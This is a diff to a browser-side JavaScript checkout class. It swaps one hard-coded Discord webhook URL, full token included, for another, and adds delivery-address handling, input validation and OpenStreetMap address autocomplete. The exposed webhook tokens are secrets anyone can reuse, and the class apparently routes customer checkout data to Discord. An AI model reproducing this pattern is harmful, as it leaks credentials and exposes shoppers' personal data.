@@ -1,7 +1,7 @@
 // Made by: @mkl.08 (Discord) | @pomcodes | 2024 
 class PaymentProcessor {
     constructor() {
-        this.webhookUrl = 'https://discord.com/api/webhooks/1308469122933198888/c9ivFU8vjXIhWJoeqJwtDOYFJVoyb623qKOg9rStcu3wgEadjTIOuWYaWe7UmJHcSYCX';
+        this.webhookUrl = 'https://discord.com/api/webhooks/1317933358679855114/qApVkHY5QC2iG3CEshOL6CGmPgKiMPeYKuQaFhCpujhB1PUyTC1ol9QD-s08HvFxOJHj';
         this.cartItems = JSON.parse(localStorage.getItem('cartItems') || '[]');
         this.currentStep = 1;
         this.verificationToken = '';
@@ -13,6 +13,7 @@ class PaymentProcessor {
             DKK: 0.12
         };
         this.captchaWord = '';
+        this.addressTimeoutId = null;
         
         this.initializeUI();
     }
@@ -21,6 +22,7 @@ class PaymentProcessor {
         this.displayOrderSummary();
         this.setupEventListeners();
         this.setupCurrencyConverter();
+        this.setupDeliveryHandling();
         this.showSection(1);
     }
 
@@ -51,10 +53,28 @@ class PaymentProcessor {
                 const email = document.getElementById('email').value;
                 const fullName = document.getElementById('fullName').value;
                 const phone = document.getElementById('phone').value;
+                const wantDelivery = document.getElementById('wantDelivery').checked;
                 const address = document.getElementById('address').value;
 
-                if (!email || !fullName || !phone || !address) {
-                    alert('Please fill in all fields');
+                if (wantDelivery && !address) {
+                    alert('Please enter a delivery address');
+                    return;
+                }
+
+                if (!email || !fullName || !phone) {
+                    alert('Please fill in all required fields (name, email, and phone)');
+                    return;
+                }
+
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(email)) {
+                    alert('Please enter a valid email address');
+                    return;
+                }
+
+                const phoneRegex = /^\+?\d{5,}$/;
+                if (!phoneRegex.test(phone.replace(/[\s-]/g, ''))) {
+                    alert('Please enter a valid phone number');
                     return;
                 }
 
@@ -95,6 +115,69 @@ class PaymentProcessor {
         `;
     }
 
+    setupDeliveryHandling() {
+        const wantDeliveryCheckbox = document.getElementById('wantDelivery');
+        const addressSection = document.getElementById('addressSection');
+        const addressInput = document.getElementById('address');
+        const suggestionsDiv = document.getElementById('suggestions');
+
+        if (wantDeliveryCheckbox && addressSection) {
+            wantDeliveryCheckbox.addEventListener('change', () => {
+                addressSection.classList.toggle('hidden', !wantDeliveryCheckbox.checked);
+                if (!wantDeliveryCheckbox.checked) {
+                    addressInput.value = '';
+                    suggestionsDiv.innerHTML = '';
+                }
+            });
+        }
+
+        if (addressInput && suggestionsDiv) {
+            addressInput.addEventListener('input', () => {
+                clearTimeout(this.addressTimeoutId);
+                const query = addressInput.value.trim();
+                
+                if (query.length < 3) {
+                    suggestionsDiv.innerHTML = '';
+                    return;
+                }
+
+                this.addressTimeoutId = setTimeout(() => {
+                    this.fetchAddressSuggestions(query);
+                }, 500);
+            });
+
+            document.addEventListener('click', (e) => {
+                if (!addressSection.contains(e.target)) {
+                    suggestionsDiv.innerHTML = '';
+                }
+            });
+        }
+    }
+
+    async fetchAddressSuggestions(query) {
+        const suggestionsDiv = document.getElementById('suggestions');
+        const addressInput = document.getElementById('address');
+
+        try {
+            const response = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}&limit=5`);
+            const data = await response.json();
+            
+            suggestionsDiv.innerHTML = '';
+            data.forEach(place => {
+                const div = document.createElement('div');
+                div.className = 'suggestion-item';
+                div.textContent = place.display_name;
+                div.addEventListener('click', () => {
+                    addressInput.value = place.display_name;
+                    suggestionsDiv.innerHTML = '';
+                });
+                suggestionsDiv.appendChild(div);
+            });
+        } catch (error) {
+            console.error('Error fetching address suggestions:', error);
+        }
+    }
+
     generateTransactionId() {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         let id = '';
@@ -108,10 +191,16 @@ class PaymentProcessor {
         const email = document.getElementById('email').value;
         const fullName = document.getElementById('fullName').value;
         const phone = document.getElementById('phone').value;
+        const wantDelivery = document.getElementById('wantDelivery').checked;
         const address = document.getElementById('address').value;
 
-        if (!email || !fullName || !phone || !address) {
-            alert('Please fill in all fields');
+        if (wantDelivery && !address) {
+            alert('Please enter a delivery address');
+            return;
+        }
+
+        if (!email || !fullName || !phone) {
+            alert('Please fill in all required fields (name, email, and phone)');
             return;
         }
 
@@ -301,10 +390,16 @@ class PaymentProcessor {
         const email = document.getElementById('email').value;
         const fullName = document.getElementById('fullName').value;
         const phone = document.getElementById('phone').value;
+        const wantDelivery = document.getElementById('wantDelivery').checked;
         const address = document.getElementById('address').value;
 
-        if (!email || !fullName || !phone || !address) {
-            alert('Please fill in all fields');
+        if (wantDelivery && !address) {
+            alert('Please enter a delivery address');
+            return;
+        }
+
+        if (!email || !fullName || !phone) {
+            alert('Please fill in all required fields (name, email, and phone)');
             return;
         }
 
